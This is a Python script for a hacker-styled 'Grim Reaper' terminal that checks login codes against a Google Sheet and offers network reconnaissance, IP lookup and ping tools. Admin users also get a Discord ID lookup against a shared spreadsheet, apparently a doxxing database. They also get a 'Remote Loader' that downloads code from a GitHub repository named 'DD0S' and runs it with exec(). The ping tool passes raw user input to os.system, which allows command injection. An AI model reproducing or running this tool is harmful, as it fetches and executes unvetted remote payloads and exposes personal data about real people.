
import turtle
import time
import os
import requests
import csv
import subprocess
import socket
import re
import random

# =========================
# Global config
# =========================
URL = "https://raw.githubusercontent.com/mikkel41/DD0S/refs/heads/main/Main"

# =========================
# ANSI COLORS (RED HACKER)
# =========================
RESET = "\033[0m"
DIM   = "\033[2m"
RED   = "\033[91m"
DARK  = "\033[31m"
GRAY  = "\033[90m"
YEL   = "\033[93m"

def red(t=""):  print(RED + t + RESET)
def dark(t=""): print(DARK + t + RESET)
def warn(t=""): print(YEL + "⚠ " + t + RESET)
def err(t=""):  print(RED + "✖ " + t + RESET)
def ok(t=""):   print(RED + "✔ " + t + RESET)
def dim(t=""):  print(DIM + t + RESET)

# =========================
# Utils
# =========================
def clear():
    os.system("cls" if os.name == "nt" else "clear")

def set_console_title(title):
    if os.name == "nt":
        os.system(f'title "{title}"')

# =========================
# GLITCH HEADER
# =========================
BASE_HEADER = [
" ██████╗ ██████╗ ██╗███╗   ███╗    ██████╗ ███████╗ █████╗ ██████╗ ███████╗██████╗ ",
"██╔════╝ ██╔══██╗██║████╗ ████║    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗",
"██║  ███╗██████╔╝██║██╔████╔██║    ██████╔╝█████╗  ███████║██████╔╝█████╗  ██████╔╝",
"██║   ██║██╔══██╗██║██║╚██╔╝██║    ██╔══██╗██╔══╝  ██╔══██║██╔═══╝ ██╔══╝  ██╔══██╗",
"╚██████╔╝██║  ██║██║██║ ╚═╝ ██║    ██║  ██║███████╗██║  ██║██║     ███████╗██║  ██║",
" ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝",
"            ── GRIM REAPER :: TERMINAL ACCESS ──"
]

def glitch(line):
    chars = "!@#$%^&*<>?/\\|"
    return "".join(c if random.random() > 0.02 else random.choice(chars) for c in line)

def print_header():
    for l in BASE_HEADER:
        print(RED + (glitch(l) if random.random() < 0.35 else l) + RESET)

# =========================
# Google Sheet login
# =========================
def check_code_google_sheet(code):
    SHEET_ID = "1sR8bO58zUTqqYKn0YRaOq-ta2HsgQsXf0FP6DVhARSE"
    url = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv"
    try:
        r = requests.get(url, timeout=5)
        for row in csv.reader(r.text.splitlines()):
            if row and row[0].strip() == code:
                return True, row[1].strip().lower()
    except:
        pass
    return False, None

# =========================
# Discord database
# =========================
def search_discord_id_in_sheet(discord_id):
    SHEET_ID = "1SywSyu3ynW9cnc_WoSed7CiMSLEWeKiKUI2XR7BfLhY"
    url = f"https://docs.google.com/spreadsheets/d/{SHEET_ID}/export?format=csv"
    try:
        r = requests.get(url, timeout=10)
        reader = csv.reader(r.text.splitlines())
        headers = next(reader)
        search = f"discord:{discord_id}".lower()
        for row in reader:
            if search in " ".join(row).lower():
                return headers, row
    except:
        pass
    return None, None

# =========================
# TOOLS (ALLE)
# =========================
def system_scan():
    clear()
    red("SYSTEM SCAN INITIATED\n")
    for i in range(0, 101, 10):
        dark(f"> scanning :: {i}%")
        time.sleep(0.15)
    ok("Scan complete.")
    input("\nPress Enter...")

def wifi_scan():
    clear()
    red("NETWORK RECON\n")
    try:
        output = subprocess.check_output("arp -a", shell=True, text=True)
        ips = sorted(set(re.findall(r"\d+\.\d+\.\d+\.\d+", output)))
    except:
        err("ARP scan failed.")
        input("\nPress Enter...")
        return

    red(f"{'IP':<18} {'Ping':<10} Host")
    red("-"*46)
    for ip in ips:
        try:
            ping = subprocess.check_output(f"ping -n 1 -w 500 {ip}", shell=True, text=True)
            ms = re.search(r"(\d+)ms", ping)
            ping_time = ms.group(1) + " ms" if ms else "?"
        except:
            ping_time = "Timeout"
        try:
            host = socket.gethostbyaddr(ip)[0]
        except:
            host = "Unknown"
        print(f"{ip:<18} {ping_time:<10} {host}")
    input("\nPress Enter...")

def ip_pinger():
    clear()
    ip = input(RED + "Ping target > " + RESET)
    os.system(f"ping {ip}")
    input("\nPress Enter...")

def ip_lookup():
    clear()
    ip = input(RED + "Lookup IP > " + RESET)
    try:
        data = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if data.get("status") != "success":
            raise Exception
        ok("IP resolved.")
        dark(f"Country : {data['country']}")
        dark(f"City    : {data['city']}")
        dark(f"ISP     : {data['isp']}")
    except:
        err("Lookup failed.")
    input("\nPress Enter...")

def discord_lookup():
    clear()
    did = input(RED + "Discord ID > " + RESET)
    headers, row = search_discord_id_in_sheet(did)
    if not row:
        err("No match found.")
    else:
        ok("MATCH FOUND:\n")
        for h, v in zip(headers, row):
            dark(f"{h}: {v}")
    input("\nPress Enter...")

# =========================
# MENU
# =========================
def main_menu(permission):
    set_console_title(f"Grim Reaper | {permission.upper()}")
    while True:
        clear()
        print_header()
        dim(f"Access Level :: {permission.upper()}\n")

        red("[1] System Scan")
        red("[2] Network Recon")
        red("[3] IP Lookup")
        red("[4] IP Pinger")

        if permission == "admin":
            red("[5] Discord Database Lookup")
            red("[6] Remote Loader")

        red("[0] Exit\n")

        c = input(RED + "grimreaper@terminal > " + RESET)

        if c == "1": system_scan()
        elif c == "2": wifi_scan()
        elif c == "3": ip_lookup()
        elif c == "4": ip_pinger()
        elif c == "5" and permission == "admin": discord_lookup()
        elif c == "6" and permission == "admin": run_latest()
        elif c == "0": break
        else:
            warn("Invalid option.")
            time.sleep(1)

# =========================
# Remote loader
# =========================
def run_latest():
    clear()
    red("REMOTE LOADER\n")
    try:
        r = requests.get(URL, timeout=10)
        r.raise_for_status()
        ok("Payload fetched.")
        input("\nExecute payload? Press Enter...")
        exec(r.text, {"__name__": "__main__"})
    except Exception as e:
        err("Execution failed.")
        print(e)
        input("\nPress Enter...")

# =========================
# MAIN
# =========================
set_console_title("Grim Reaper | Initializing")

while True:
    clear()
    print_header()
    code = input(RED + "access@grimreaper > " + RESET)
    ok_login, perm = check_code_google_sheet(code)
    if ok_login:
        ok("Access granted.")
        time.sleep(1)
        break
    else:
        err("Access denied.")
        time.sleep(1.5)

main_menu(perm)

